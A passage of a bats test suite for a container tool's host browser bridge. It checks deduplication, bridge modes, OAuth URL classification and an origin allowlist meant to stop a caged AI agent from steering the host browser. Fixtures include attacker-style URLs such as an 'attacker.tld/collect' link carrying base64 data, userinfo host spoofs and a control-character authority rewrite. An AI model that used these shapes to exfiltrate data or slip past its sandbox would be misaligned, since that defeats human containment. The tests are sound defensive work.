#!/usr/bin/env bats
# ── Browser bridge (_browser_claim_url) ───────────────────────────────────────
#
# The host-side watcher forwards URLs written by the container's open-bridge shim
# to the host browser. Each pending URL must be opened EXACTLY ONCE even when
# several watchers are alive on the same bridge dir (an orphan left by a crashed
# session plus the current one). `_browser_claim_url` enforces that with an atomic
# rename: whoever wins the `mv` opens the URL; everyone else gets nothing.
load "../setup"
setup() {
  _common_setup
  source_cli
  BRIDGE="$TEST_TEMP/.browser-open"
}
teardown() { _common_teardown; }

@test "browser bridge: claims a pending URL and consumes the file" {
  printf '%s\n' "https://example.com/x" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output "https://example.com/x"
  [ ! -f "$BRIDGE" ]  || return 1   # file consumed
}

@test "browser bridge: returns nonzero when there is nothing to claim" {
  run _browser_claim_url "$BRIDGE"   # no file exists
  assert_failure
  assert_output ""
}

@test "browser bridge: a URL is claimed by exactly ONE of two racing watchers" {
  printf '%s\n' "https://example.com/once" > "$BRIDGE"
  # First watcher wins the claim.
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output "https://example.com/once"
  # Second watcher (the orphan) finds nothing → one host tab, not two.
  run _browser_claim_url "$BRIDGE"
  assert_failure
  assert_output ""
}

@test "browser bridge: consuming an empty bridge file is harmless" {
  : > "$BRIDGE"   # empty file
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output ""
  [ ! -f "$BRIDGE" ]  || return 1
}

@test "browser bridge: the claim read is bounded" {
  # The box picks the file's size. An unbounded `cat` put the whole thing in a
  # shell variable and then on an `echo` into the log. The cap is far above the
  # 2048 bytes _bridge_url_host accepts, so nothing openable is ever cut.
  printf 'https://claude.ai/%s' "$(printf 'a%.0s' $(seq 1 20000))" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_success
  [ "${#output}" -le 8192 ] || { echo "the claim read ${#output} bytes from a box-sized file"; return 1; }
}

@test "browser bridge: leaves no .opening temp file behind" {
  printf '%s\n' "https://example.com/y" > "$BRIDGE"
  _browser_claim_url "$BRIDGE" >/dev/null
  run bash -c "ls \"$TEST_TEMP\"/.browser-open.opening.* 2>/dev/null"
  assert_output ""
}

@test "browser bridge: watcher self-exits when its run dir is removed (orphan cleanup)" {
  # The fix's anti-orphan half: a watcher left behind by a crashed session must
  # stop polling once its run dir is gone (cleat rm/clean/nuke), instead of
  # spinning forever and re-opening URLs. Delete the `[ -d "$clip_dir" ]` guard
  # in _browser_watcher and this test fails (mutation-verified).
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  _browser_watcher "$clip_dir" "true" "" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1.5                                   # let it enter the poll loop
  kill -0 "$wpid" 2>/dev/null  || { echo "watcher exited prematurely"; return 1; }
  rm -rf "$clip_dir"                           # session removed → orphan must stop
  local i alive=1
  for i in 1 2 3 4 5 6 7 8 9 10; do
    if ! kill -0 "$wpid" 2>/dev/null; then alive=0; break; fi
    sleep 0.5
  done
  [ "$alive" = 1 ] && kill "$wpid" 2>/dev/null
  [ "$alive" = 0 ]  || { echo "watcher kept spinning after clip_dir removal"; return 1; }
}

@test "browser bridge: two distinct URLs both open (no same-second drop)" {
  # The old mtime-second dedup dropped a 2nd URL written in the same wall-clock
  # second. Consuming the file removes that failure mode: both are claimable.
  printf '%s\n' "https://example.com/a" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_output "https://example.com/a"
  printf '%s\n' "https://example.com/b" > "$BRIDGE"   # same second in a fast test
  run _browser_claim_url "$BRIDGE"
  assert_output "https://example.com/b"
}

# ── Same-URL debounce (atomic per-URL marker) ─────────────────────────────────
# One user action can write the bridge file SEVERAL times (a TUI link click
# fires the open shim on press and release). The claim makes each write open
# once; the debounce makes each URL open once per window even across multiple
# writes claimed by DIFFERENT watchers: the one-click-N-tabs bug. The debounce is
# an atomic `mkdir` of a per-URL marker dir (not a read-then-write stamp), so two
# racing watchers can't both pass it. Markers self-expire by their own mtime.

@test "browser bridge: a repeat of the same URL inside the window is deduped" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # first sighting → open it (and claim the marker)
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_success   # immediate repeat → suppressed
}

@test "browser bridge: a different URL is never debounced" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure
  run _browser_recently_opened "$dir" "https://example.com/y"
  assert_failure   # distinct URL right after → still opens
}

@test "browser bridge: concurrent watchers open one URL exactly once (atomic debounce)" {
  # The one-click-TWO-tabs bug that survived the atomic claim. Two writes of the
  # SAME url (press + release) claimed by two live watchers (a login alongside a
  # session, two shells on one box, or a leaked orphan) both used to pass the old
  # read-then-write stamp before either wrote it. The atomic mkdir claim must
  # elect exactly ONE opener no matter how many fire at once. Mutation-verified
  # (mkdir → mkdir -p makes the claim non-exclusive and this fails).
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  local n=24 i wins
  local results="$TEST_TEMP/race_wins"; : > "$results"
  local go="$TEST_TEMP/race_go"
  for i in $(seq 1 "$n"); do
    ( while [ ! -f "$go" ]; do :; done            # barrier: maximise overlap
      if _browser_recently_opened "$dir" "https://example.com/race"; then :; else
        echo win >> "$results"                    # rc 1 = "open it" = a winner
      fi
    ) &
  done
  sleep 0.2                                        # let every racer reach the barrier
  touch "$go"
  wait
  wins="$(grep -c win "$results" 2>/dev/null)"; wins="${wins:-0}"
  [ "$wins" -eq 1 ] || { echo "expected exactly 1 opener across $n racers, got $wins"; return 1; }
}

@test "browser bridge: the same URL opens again once the window has passed" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure                                   # first sighting opens, claims a marker
  local m
  for m in "$dir"/.open.*; do touch -t 200001010000 "$m" 2>/dev/null || true; done
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # marker predates the window → swept → opens again normally
}

@test "browser bridge: a leftover marker with no readable time fails open (never wedges)" {
  # A marker left in a broken state (mtime unreadable → treated as epoch 0, far
  # past the window) must be swept, never permanently suppress a URL.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  local hash; hash="$(printf '%s' "https://example.com/x" | cksum)"; hash="${hash// /_}"
  mkdir -p "$dir/.open.$hash"
  touch -t 200001010000 "$dir/.open.$hash" 2>/dev/null || true
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # ancient/broken marker must never block an open
}

@test "browser bridge: the watcher consults the debounce before opening" {
  # Retargeted onto an allowlisted origin and an auth-shaped URL. It protected
  # the ORDERING (the debounce is consulted before anything opens), and that is
  # unchanged. The fixture moved because a plain link at example.com is now
  # refused by the destination gate, so it could never reach the opener and the
  # ordering would go untested.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_recently_opened() { touch "$TEST_TEMP/debounce_consulted"; return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7                                  # let it pass the startup rm -f
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ]        || { echo "URL never opened"; return 1; }
  [ -f "$TEST_TEMP/debounce_consulted" ] || { echo "watcher skipped the debounce"; return 1; }
}

@test "browser bridge: watcher self-exits when its spawning cleat process dies" {
  # The accumulation half of the one-click-N-tabs bug: a watcher whose cleat
  # process was SIGKILL'd (closed terminal) skips the cleanup trap and used to
  # poll forever: every crashed session added one more tab per click. The
  # liveness check reaps it within a poll tick.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/spawner.sh" <<EOF
source "$TEST_TEMP/cli_stripped"
_browser_watcher "$dir" "true" "" >/dev/null 2>&1 &
echo "\$!" > "$TEST_TEMP/watcher_pid"
kill -9 \$\$
EOF
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  bash "$TEST_TEMP/spawner.sh" 2>/dev/null || true
  local wpid dead=0
  wpid="$(cat "$TEST_TEMP/watcher_pid")"
  process_exited "$wpid" && dead=1
  # Unconditional reap: a live straggler holds bats' fd and hangs the file.
  kill "$wpid" 2>/dev/null || true
  [ "$dead" = 1 ] || { echo "watcher outlived its dead parent"; return 1; }
}

# ── No-duplicate bridge policy (CLEAT_BROWSER_BRIDGE) ──────────────────────────
# A clicked link is opened by the HOST TERMINAL itself (it makes URLs clickable);
# the in-container `open` shim ALSO writes the bridge, so the watcher opening it
# again is a second tab ~0.5s later. The watcher cannot see the terminal's open,
# so on an interactive terminal it DEFERS plain links to the terminal. Auth URLs
# (a localhost OAuth callback the user never clicks) and non-interactive sessions
# (nothing else opens them) always open via the bridge. CLEAT_BROWSER_BRIDGE
# overrides: always = open everything (pre-toggle behavior), off = open nothing.

@test "bridge mode: defaults to auto when unset" {
  unset CLEAT_BROWSER_BRIDGE
  run _browser_bridge_mode
  assert_output "auto"
}

@test "bridge mode: honors always and off, and falls back to auto on a typo" {
  CLEAT_BROWSER_BRIDGE=always run _browser_bridge_mode
  assert_output "always"
  CLEAT_BROWSER_BRIDGE=off run _browser_bridge_mode
  assert_output "off"
  CLEAT_BROWSER_BRIDGE=banana run _browser_bridge_mode    # unknown never wedges
  assert_output "auto"
}

@test "bridge policy: auto DEFERS a plain link on an interactive terminal (no duplicate)" {
  # mode=auto, host_opens_clicks=1, is_auth=0 -> the terminal owns it -> defer.
  run _browser_should_open auto 1 0
  assert_failure
}

@test "bridge policy: auto OPENS an auth URL even on an interactive terminal" {
  # Retargeted for the destination gate. It protected the rule that the user
  # never clicks an auth URL, so the bridge and the callback proxy own it. That
  # rule is unchanged, but the call now carries a fourth argument: an auth URL
  # at a destination that is NOT on the allowlist opens nothing, which is what
  # the gate exists for. The is_auth=1, dest=0 case has its own test above.
  run _browser_should_open auto 1 1 1
  assert_success
}

@test "bridge policy: auto DEFERS a plain link when no terminal is attached" {
  # Retargeted, and this one is a behaviour CHANGE rather than a new argument.
  # It protected "off a TTY nothing else opens the link, so the bridge must".
  # That window is cleat login (host_opens_clicks=0 unconditionally), a pipe,
  # cron, CI and nohup, which is the unattended overnight run. With nobody
  # watching the browser there is no user value in opening a plain link the box
  # chose, and it is exactly the exfiltration primitive. `always` restores the
  # old behaviour in one line for anyone who wants it, which the test below pins.
  run _browser_should_open auto 0 0 1
  assert_failure
  run _browser_should_open always 0 0 1
  assert_success
}

@test "bridge policy: always opens every URL; off opens none" {
  run _browser_should_open always 1 0   # plain + interactive: forced open
  assert_success
  run _browser_should_open always 0 0
  assert_success
  run _browser_should_open off 0 1      # even an auth URL: off opens nothing
  assert_failure
  run _browser_should_open off 0 0
  assert_failure
}

# ── _is_auth_url: OAuth URL classification ──────────────────────────────────
# Auth means "carries a redirect_uri= query param", NOT "has a loopback
# callback": Claude Code's code-paste login flow points redirect_uri at
# console.anthropic.com and still must auto-open (the user cannot click a URL
# claude emits programmatically through the open shim).

@test "auth url: loopback authorize URL classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&scope=a"
  assert_success
}

@test "auth url: code-paste authorize URL (console callback, no loopback) classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?code=true&client_id=x&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user"
  assert_success
}

@test "auth url: redirect_uri as the first query param classifies as auth" {
  # Retargeted onto an allowlisted origin. It protected the PARSING rule, that
  # redirect_uri is recognised when it is the first query parameter (a `?`
  # rather than an `&` in front of it), and that half is unchanged. The origin
  # moved because auth now requires one: example.test is not somewhere Cleat
  # will point a browser, so the old fixture can no longer be auth by
  # definition. The `?`-versus-`&` distinction is what this test still guards.
  run _is_auth_url "https://claude.ai/authorize?redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb"
  assert_success
  run _is_auth_url "https://claude.ai/authorize?a=1&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb"
  assert_success
}

@test "auth url: plain links do not classify as auth" {
  run _is_auth_url "https://example.com/docs/oauth"
  assert_failure
  run _is_auth_url "https://example.com/redirect_uris"
  assert_failure
  # redirect_uri in the PATH, not as a query param, is not an OAuth request
  run _is_auth_url "https://example.com/path/redirect_uri=abc"
  assert_failure
}


# ── the destination gate ────────────────────────────────────────────────────
#
# The box writes a URL and the HOST opens it, in the host's browser, with the
# host's cookies. Everything below is about the one question that gate answers:
# where is that browser allowed to go.

@test "url host: parses the authority out of an ordinary URL" {
  run _bridge_url_host "https://claude.ai/oauth/authorize?x=1#frag"
  assert_success
  assert_output "claude.ai"
}

@test "url host: folds case, because DNS does and bash 3.2 has no \${var,,}" {
  run _bridge_url_host "HTTPS://CLAUDE.AI/x"
  assert_success
  assert_output "claude.ai"
}

@test "url host: userinfo is rejected, never stripped" {
  # https://claude.ai@evil.example/ has the ATTACKER's host to the right of the
  # @. Taking ${authority%%@*} hands back `claude.ai`, which is the name they
  # chose for exactly this reason.
  run _bridge_url_host "https://claude.ai@evil.example/"
  assert_failure
  run _bridge_url_host "https://user:pw@evil.example/"
  assert_failure
}

@test "url host: a port is cut, an IPv6 literal is refused" {
  run _bridge_url_host "https://claude.ai:8443/x"
  assert_success
  assert_output "claude.ai"
  # Success must always mean "this is a hostname" for every later caller.
  run _bridge_url_host "https://[::1]/x"
  assert_failure
  run _bridge_url_host "http://[2606:4700::1111]:8080/"
  assert_failure
}

@test "url host: only http and https, and only up to 2048 bytes" {
  local scheme
  for scheme in ftp file javascript data; do
    run _bridge_url_host "${scheme}://claude.ai/x"
    assert_failure
  done
  run _bridge_url_host "https://"
  assert_failure
  run _bridge_url_host "https://$(printf 'a%.0s' $(seq 1 3000)).example.com/"
  assert_failure
}

@test "url host: an authority byte outside the charset is refused" {
  # One rule covers a percent-encoded authority, a backslash, an underscore, a
  # space and every non-ASCII confusable.
  run _bridge_url_host "https://claude%2eai.evil.example/"
  assert_failure
  run _bridge_url_host "https://claude.ai\\@evil.example/"
  assert_failure
  run _bridge_url_host "https://claude_ai.example/"
  assert_failure
  run _bridge_url_host "https://xn--clude-mua.ai/"   # punycode is ASCII, so it parses
  assert_success
}

@test "url host: a trailing dot is a different string for the same name" {
  # claude.ai. resolves and never equals the list entry claude.ai.
  run _bridge_url_host "https://claude.ai./x"
  assert_failure
  run _bridge_url_host "https://.claude.ai/x"
  assert_failure
  run _bridge_url_host "https://claude..ai/x"
  assert_failure
}

@test "origin gate: every shipped origin is allowed by exact host" {
  local o
  for o in $_BROWSER_ORIGINS; do
    run _bridge_dest_allowed "https://${o}/some/path?q=1"
    assert_success
  done
}

@test "origin gate: a near miss is not a match" {
  # Exact membership, never a suffix: a *claude.ai pattern also matches
  # evilclaude.ai, which is how an origin allowlist usually fails.
  local bad
  for bad in evilclaude.ai claude.ai.evil.tld githubb.com github.com.evil.tld \
             wwww.npmjs.com npmjs.com sub.claude.ai; do
    run _bridge_dest_allowed "https://${bad}/x"
    assert_failure
  done
}

@test "origin gate: api.anthropic.com is deliberately NOT on the list" {
  # An API host is never a browser destination. Including it is the
  # API-versus-browser confusion that widens the surface and still fails to work.
  run _bridge_dest_allowed "https://api.anthropic.com/v1/messages"
  assert_failure
}

@test "origin gate: loopback and private space are refused on the opened URL" {
  # Allowed by the list and still refused. Without this the rule would be
  # indistinguishable from "none of these happen to be shipped defaults", and a
  # user could hand the box an authenticated navigation into a service on their
  # own machine with one env var.
  CLEAT_BROWSER_ORIGINS="localhost 127.0.0.1 10.1.2.3 192.168.1.1 172.16.0.1 printer.local"
  local h
  for h in localhost 127.0.0.1 127.1.2.3 0.0.0.0 169.254.169.254 \
           10.1.2.3 192.168.1.1 172.16.0.1 172.31.255.1 printer.local; do
    run _bridge_dest_allowed "http://${h}:8080/x"
    assert_failure
  done
  # Outside the private ranges, so only the allowlist decides.
  run _bridge_host_is_local "172.15.0.1"
  assert_failure
  run _bridge_host_is_local "172.32.0.1"
  assert_failure
}

@test "origin gate: a loopback redirect_uri VALUE still parses (hands-free login)" {
  # The loopback rule is about the authority of the URL that is OPENED. Applying
  # it to redirect_uri would kill the callback proxy and the login with it.
  run _extract_callback_port "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback"
  assert_success
  assert_output "45454"
}

@test "origins env: CLEAT_BROWSER_ORIGINS APPENDS, it never replaces" {
  # The single most important property of this variable: a user who sets it to
  # add one origin must not silently lose claude.ai and break their own login.
  CLEAT_BROWSER_ORIGINS="auth.example.com"
  run _bridge_dest_allowed "https://auth.example.com/authorize"
  assert_success
  run _bridge_dest_allowed "https://claude.ai/oauth/authorize"
  assert_success
}

@test "origins env: commas, whitespace and full URLs are all accepted" {
  CLEAT_BROWSER_ORIGINS="a.example.com, https://b.example.com/ignored  c.example.com"
  local h
  for h in a.example.com b.example.com c.example.com; do
    run _bridge_dest_allowed "https://${h}/x"
    assert_success
  done
}

@test "origins env: a malformed entry is dropped, never treated as a wildcard" {
  CLEAT_BROWSER_ORIGINS="*.example.com  evil example.com@attacker.tld  ok.example.com"
  run _bridge_dest_allowed "https://anything.example.com/x"
  assert_failure
  run _bridge_dest_allowed "https://attacker.tld/x"
  assert_failure
  run _bridge_dest_allowed "https://ok.example.com/x"
  assert_success
  # And it is named, or it reads as "I allowed it and it still does not work".
  run _bridge_origins_from_env bad
  assert_output --partial "*.example.com"
}

@test "origins env: an absurd value is ignored rather than walked per claim" {
  CLEAT_BROWSER_ORIGINS="$(printf 'a.example.com %.0s' $(seq 1 400))"
  run _bridge_origins_from_env ok
  assert_output ""
  run _bridge_dest_allowed "https://claude.ai/x"
  assert_success
}

@test "origins config: the GLOBAL config adds an origin, the project .cleat never does" {
  # /workspace/.cleat is a file the caged agent edits as ordinary work, so an
  # allowlist it can write is not an allowlist. The trust prompt does not save
  # it either: that prompt's subject line names capabilities.
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[browser]\norigin = fromglobal.example.com\n' > "$CLEAT_GLOBAL_CONFIG"
  printf '[browser]\norigin = fromproject.example.com\n' > "$TEST_TEMP/.cleat"
  run _bridge_dest_allowed "https://fromglobal.example.com/x"
  assert_success
  run _bridge_dest_allowed "https://fromproject.example.com/x"
  assert_failure
}

@test "origins config: cleat browser allow writes it and keeps the rest of the file" {
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[caps]\ndocker\n' > "$CLEAT_GLOBAL_CONFIG"
  run cmd_browser allow auth.example.com
  assert_success
  run _bridge_dest_allowed "https://auth.example.com/x"
  assert_success
  run cat "$CLEAT_GLOBAL_CONFIG"
  assert_output --partial "[caps]"
  assert_output --partial "docker"
  # Twice is idempotent, not a duplicate.
  run cmd_browser allow auth.example.com
  assert_success
  assert_output --partial "already allowed"
}

@test "origins config: cleat browser allow refuses a loopback host and a non-host" {
  run cmd_browser allow localhost
  assert_failure
  run cmd_browser allow 127.0.0.1
  assert_failure
  run cmd_browser allow "not a host"
  assert_failure
}

@test "auth url: an allowlisted authorize URL still classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&scope=a"
  assert_success
}

@test "auth url: the code-paste flow still classifies as auth" {
  # console.anthropic.com, no loopback callback. Claude 2.1.191+ hands the URL
  # only to \$BROWSER and never prints it, so deferring this one strands a login
  # with nothing on screen to recover from.
  run _is_auth_url "https://claude.ai/oauth/authorize?code=true&client_id=x&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user"
  assert_success
}

@test "auth url: an unallowlisted origin is never auth, whatever it carries" {
  # The old test was a bare substring, so this was AUTH, and the auto branch
  # returned on is_auth BEFORE it consulted the terminal.
  run _is_auth_url "https://evil.example.com/pwn?redirect_uri=x"
  assert_failure
  run _is_auth_url "http://attacker.tld/collect?redirect_uri=&d=BASE64"
  assert_failure
  run _is_auth_url "https://webhook.site/abc?redirect_uri=1"
  assert_failure
  # And the one that isolates the ORIGIN check: a perfectly well formed OAuth
  # authorize URL, at a host Cleat will not point a browser at.
  run _is_auth_url "https://evil.example.com/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback"
  assert_failure
}

@test "auth url: a fragment-borne redirect_uri is not auth" {
  # A fragment is never sent to the server, so it is not part of an OAuth
  # request. The old glob matched it there, and _extract_callback_port reads the
  # whole string, so the host bound a port for it too.
  run _is_auth_url "https://claude.ai/x#&redirect_uri=http://localhost:3000/"
  assert_failure
}

@test "auth url: userinfo in the outer URL is not auth" {
  run _is_auth_url "https://claude.ai@evil.example/?redirect_uri=http%3A%2F%2Flocalhost%3A8080%2F"
  assert_failure
}

@test "auth url: a redirect_uri that is not an absolute http(s) URL is not auth" {
  run _is_auth_url "https://claude.ai/x?redirect_uri=x"
  assert_failure
  run _is_auth_url "https://claude.ai/x?redirect_uri=javascript%3Aalert(1)"
  assert_failure
}

@test "auth url: redirect_uri in the PATH is still not auth" {
  run _is_auth_url "https://claude.ai/path/redirect_uri=abc"
  assert_failure
}

@test "bridge policy: auto opens an allowlisted auth URL" {
  run _browser_should_open auto 1 1 1
  assert_success
  run _browser_should_open auto 0 1 1
  assert_success
}

@test "bridge policy: auto never opens an unallowlisted destination" {
  # The destination is the one thing nothing else in the function can
  # substitute for. is_auth used to return early, so a terminal was irrelevant.
  run _browser_should_open auto 1 1 0
  assert_failure
  run _browser_should_open auto 0 1 0
  assert_failure
  run _browser_should_open auto 0 0 0
  assert_failure
}

@test "bridge policy: auto defers a plain link, terminal or not" {
  # With a terminal this is unchanged: the terminal opens a clicked link itself.
  run _browser_should_open auto 1 0 1
  assert_failure
  # Without one it is the change that matters. That window is cleat login, a
  # pipe, cron, CI and nohup, which is the unattended overnight run: nobody is
  # watching the browser, so opening a link the box chose has no user value.
  run _browser_should_open auto 0 0 1
  assert_failure
}

@test "bridge policy: always is a full bypass and off opens nothing" {
  run _browser_should_open always 1 0 0
  assert_success
  run _browser_should_open always 0 0 0
  assert_success
  run _browser_should_open off 0 1 1
  assert_failure
}


# ── the gate, driven through the real watcher ───────────────────────────────

_bw_fake_open() {
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
}

# Run the watcher against one URL and stop. $1 = the URL, $2 = bridge mode,
# $3 = host_opens_clicks, $4 = container name (empty for no proxy).
_bw_run_once() {
  local url="$1" mode="${2:-auto}" clicks="${3:-1}" cname="${4:-}"
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _bw_fake_open
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "$cname" "$mode" "$clicks" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "$url" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8; do
    grep -q "opening URL\|deferring URL\|BLOCKED-ORIGIN" "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.4
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
}

@test "browser bridge: an unallowlisted origin is refused and never opened" {
  _bw_run_once "https://evil.example.com/pwn?redirect_uri=x" auto 1 ""
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the bridge opened a destination the box chose"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "BLOCKED-ORIGIN"
  assert_output --partial "origin=evil.example.com"
}

@test "browser bridge: an allowlisted auth URL still opens" {
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" auto 1 "mybox"
  [ -f "$TEST_TEMP/opened.log" ] || { echo "an allowlisted auth URL was not opened"; return 1; }
}

@test "browser bridge: the gate reads the bytes that are OPENED, not the raw claim" {
  # Stripping control characters REWRITES an authority: claude.ai<CR>.evil.example
  # becomes claude.ai.evil.example, a different host. The opener is handed the
  # cleaned copy, so a policy that read the raw claim would be deciding about a
  # destination the browser never visits.
  # Two halves. First: stripping control characters REWRITES an authority, so
  # the two strings are different destinations and only the cleaned one is ever
  # visited.
  local raw; raw="$(printf 'https://claude.ai\r.evil.example/x')"
  local cleaned; cleaned="$(printf '%s' "$raw" | LC_ALL=C tr -d '[:cntrl:]')"
  run _bridge_url_host "$cleaned"
  assert_success
  assert_output "claude.ai.evil.example"
  run _bridge_dest_allowed "$cleaned"
  assert_failure
  _bw_run_once "$raw" auto 1 ""
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the bridge opened a rewritten authority"; return 1; }

  # Second, and this is the half that pins WHICH string the gate reads: a
  # control character after the host makes the raw claim unparseable while the
  # cleaned copy is an ordinary allowlisted auth URL. Deciding on the raw claim
  # would refuse a login that is perfectly fine.
  rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/opened.log"
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  local ok; ok="$(printf 'https://claude.ai\r/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A1455%%2Fcb')"
  run _bridge_url_host "$ok"
  assert_failure
  _bw_run_once "$ok" auto 1 "mybox"
  [ -f "$TEST_TEMP/opened.log" ] || { echo "the gate judged the raw claim instead of the bytes it opens"; return 1; }
}

@test "browser bridge: the callback proxy does not bind for an unallowlisted origin" {
  # Before the gate this ran in EVERY mode, off included, so the box could make
  # the host bind a loopback port and forward into the container with no tab and
  # nothing on screen. It is the only mechanism in Cleat that binds a box-chosen
  # host port.
  local mode
  for mode in auto always off; do
    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/proxy_started" "$TEST_TEMP/opened.log"
    _extract_callback_port() { echo "1455"; return 0; }
    _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
    _port_in_use() { return 1; }
    _bw_run_once "https://evil.example.com/x?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" "$mode" 1 "mybox"
    [ ! -f "$TEST_TEMP/proxy_started" ] || { echo "the proxy bound a box-chosen port for an unallowlisted origin in mode=$mode"; return 1; }
  done
}

@test "browser bridge: off mode still runs the proxy for an ALLOWLISTED origin" {
  # off withholds every open, and the login must still complete when the user
  # opens the URL by hand.
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" off 0 "mybox"
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "off mode stopped the callback proxy, which strands a hand-opened login"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser"; return 1; }
}

@test "browser bridge: a callback port a host service already holds opens nothing" {
  # Binding is impossible, and opening the browser anyway aims it at THAT
  # service with the host's cookies, for a port the box named.
  _extract_callback_port() { echo "5432"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _port_in_use() { return 0; }   # something is listening
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5432%2Fcb" auto 1 "mybox"
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser was pointed at a port a host service holds"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "already in use"
}

@test "browser bridge: a proxy that never binds opens nothing" {
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { sleep 5; }    # starts, never touches the ready file
  _port_in_use() { return 1; }
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" auto 1 "mybox"
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser opened before the callback listener existed"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "never bound"
}

@test "browser bridge: always is a full bypass, by design and documented" {
  _bw_run_once "https://evil.example.com/x" always 1 ""
  [ -f "$TEST_TEMP/opened.log" ] || { echo "always must keep opening every origin, or one wrong default entry is unrecoverable"; return 1; }
}

# ── the denial report on the terminal ───────────────────────────────────────

@test "blocked report: names the URL, the bare origin and the command that allows it" {
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=auth.example.com url=https://auth.example.com/oauth/authorize?client_id=abc\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_success
  assert_output --partial "Blocked"
  assert_output --partial "https://auth.example.com/oauth/authorize?client_id=abc"
  assert_output --partial "cleat browser allow auth.example.com"
